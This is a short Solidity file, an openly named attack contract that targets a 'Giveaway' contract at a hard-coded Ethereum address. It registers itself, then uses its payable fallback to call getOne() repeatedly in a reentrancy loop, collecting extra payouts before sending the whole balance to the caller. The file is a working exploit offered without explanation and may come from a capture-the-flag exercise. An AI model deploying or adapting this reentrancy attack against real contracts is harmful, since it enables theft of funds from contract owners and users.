pragma solidity ^0.4.23;

contract Giveaway {
    function register(address toRegister) public;
    function getOne() public;
}

contract Hack {
    
    uint128 times = 3;
    uint128 current = 0;
    Giveaway test = Giveaway(0xe350EEf4aAb5a55d4efaa2Aa6f7D7420057EEe2A);

    
    function hackGiveaway() public {
        test.register(address(this));
        test.getOne();
        drainThis();
    }

    
    function() public payable{
        if(current<times){
            current++;
            test.getOne();
        }
    }

    
    function drainThis() internal {
        msg.sender.transfer(address(this).balance);
    }
}
